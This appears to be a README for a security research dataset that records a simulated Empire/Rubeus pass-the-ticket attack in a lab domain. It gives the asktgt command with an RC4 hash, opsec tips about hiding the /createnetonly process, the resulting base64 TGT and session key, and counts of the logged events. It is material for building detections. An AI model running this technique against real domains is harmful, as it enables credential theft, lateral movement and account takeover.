
# Empire Rubeus PTT CreateNetOnly

The asktgt action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (/rc4, /aes128, /aes256, or /des). A /password flag can also be used instead of a hash - in this case /enctype:X will default to RC4 for the exchange, with des|aes128|aes256 as options. If no /domain is specified, the computer's current domain is extracted, and if no /dc is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The /ptt flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The /luid:0xA.. flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.

Note that no elevated privileges are needed on the host to request TGTs or apply them to the current logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the /ptt option. A workaround is to use the /createnetonly:C:\X.exe parameter (which hides the process by default unless the /show flag is specified), or request the ticket and apply it to another logon session with ptt /luid:0xA.. [Reference](https://github.com/GhostPack/Rubeus)

## Technique(s) ID

T1097

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_rubeus_asktgt_ptt_createnetonly.tar.gz](./empire_rubeus_asktgt_ptt_createnetonly.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-19151006

## About this file

| log_name                                 | task                                                   |   events_count  |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |             537 |
| System                                   | Service State Event                                    |               9 |
| Security                                 | Filtering Platform Connection                          |             378 |
| Security                                 | Token Right Adjusted Events                            |             273 |
| Security                                 | Other Policy Change Events                             |             234 |
| Security                                 | User Account Management                                |             216 |
| Security                                 | Group Membership                                       |              22 |
| Security                                 | Logon                                                  |              22 |
| Security                                 | Special Logon                                          |              19 |
| Security                                 | Process Creation                                       |              18 |
| Security                                 | Sensitive Privilege Use                                |              15 |
| Security                                 | Logoff                                                 |              13 |
| Security                                 | Detailed File Share                                    |              10 |
| Security                                 | Authorization Policy Change                            |               8 |
| Security                                 | Process Termination                                    |               8 |
| Security                                 | File Share                                             |               4 |
| Security                                 | Kerberos Authentication Service                        |               1 |
| Security                                 | Other Object Access Events                             |               1 |
| Security                                 | Security System Extension                              |               1 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             525 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             503 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |             235 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |             186 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              44 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              26 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |              12 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |              11 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |              10 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |             448 |

## Empire Activity

```
(Empire: G6BYHU4F) > 
c4:b415baa073a14f81f8c89a2a384f4a68 /createnetonly:C:\Windows\System32\cmd.exe
[*] Tasked G6BYHU4F to run TASK_SHELL
[*] Agent G6BYHU4F tasked with task ID 5.5.exe asktgt /user:Mmidge /d 
(Empire: G6BYHU4F) > ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 


[*] Action: Create Process (/netonly)

[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 8148
[+] LUID            : 0x53b3d71

[*] Action: Ask TGT

[*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68
[*] Target LUID : 87768433
[*] Using domain controller: HFDC01.shire.com (172.18.39.5)
[*] Building AS-REQ (w/ preauth) for: 'shire.com\Mmidge'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6yEK7banoUxPpUq
      EoMNXT5YSlapCf/5ejnJ9j73z2CC1V54tAWP6wWOUkw1o5EWzeYqywcEhXsQVW/zC0fUk9f05GnMTINY
      fK1yBdXTeUK2EL53Fq7CJkhKQdFxuNe80oROsp55hO9l4YwtHyNT6hxMuvcOO24dgB/1esaQJd0IqwRM
      wICi6t/RS9Ac7PKOzXIyojGvTFI/zneR55Z0g7x+CJWN6FUO5zWG8QrCt2wAcWvvv0TusvK2Zkd3JHJ1
      pTpSf6WlGK8EH5aExqTUAznFynXebqBPdmvgSkkJf6U/Z/Dy7U6KIojujr9/vyhdLUzAtVfyc3tUGZQS
      n63UXkEVbadKNZ5m/SFr3cwNEeG9hyvyisfJMhm49fVDdEVbHrXrZfNZN5a1cqbbSkJezII0AgV9rP9J
      PUgE8FMbfBL1gwyPZDu1PgYO0UuxJMQg4Kb1JIBjOsCx2Q9yuKXPM9wKccF4ys0qYxw5kzV/ujZIgvAS
      XJwzlFSegjprZxljUzI5k9LDnFz7RXATScg0un0KUCHuSFsnvhHAbxe12xbEYWDG3vVu3k7uN2kkoUcb
      xbGq2kcu/ayDJc50uSIXxwR87n1Cqt6wtydk79460C8EKwONd8VT8cbmuwlQQvQ4uz1eeS0D4TOshOlx
      wm/dG4CZ/asRDkKu2iZWi5tBrMS2lSPxP5QLvbiYdBhIcbZrrjtFjJ9O2cxhYolj+sE01cbQx3HKR9mm
      rx8k5buBdLyWIWy9RzkRPytqiWYdXyNmfdkVFUNI/YoP39mJX+Pu07eS76F72VEzie+c24o9YRe/1Ma6
      FOZYNXypbgswOz6vVTKX9ItSp6nUHhDwJ5YH+QJsu3HcNqcUBCi5fwDCHkaXXx+YwJLNohuckQaDa2L/
      NlZM7ZL+Q5GSZ27NCYlPsvmTNmGN/gVYKMJqJor2BF7KdS/Cg6w76tm+4nOCe8pCEG3pfOofLAeNGFNk
      QGhGwyqb9G3Lx9MhLyrBhkJtmol3FKd8dm/7r/g9bKndVGejwa0DdsxesNCzOhZCpL2rChz5+ty2vvKi
      FQi+iuAqKR9ANqaZ2VJx8qGsmOi+Qr7rEo0dm9rVIrOwa96CCFjWIUzDbN0goMuaRaMcv8zp4NRmfSUQ
      Hsoiymm8U7yjh3JuURc7AEbQFrACIiDiBvLP8pZca483tchXlkXy+haf0vpc+t+W3IeXwI3PQOjGwTnC
      wbjaT5LGn4uc5rIQuN4QQt/+1T7xJhYvA7NMnyqho4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw
      ga6gGzAZoAMCARehEgQQfcfUVG4dvCBEsY+L2tRNMaELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN
      bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxOTEzMjRaphEYDzIwMTkwMzIwMDUxMzI0WqcRGA8yMDE5
      MDMyNjE5MTMyNFqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=

[*] Action: Import Ticket
[*] Target LUID: 0x53b3d71
[+] Ticket successfully imported!

[*] Action: Describe Ticket

  UserName              :  Mmidge
  UserRealm             :  SHIRE.COM
  ServiceName           :  krbtgt/shire.com
  ServiceRealm          :  SHIRE.COM
  StartTime             :  3/19/2019 2:13:24 PM
  EndTime               :  3/20/2019 12:13:24 AM
  RenewTill             :  3/26/2019 2:13:24 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  fcfUVG4dvCBEsY+L2tRNMQ==


..Command execution completed.

(Empire: G6BYHU4F) >
```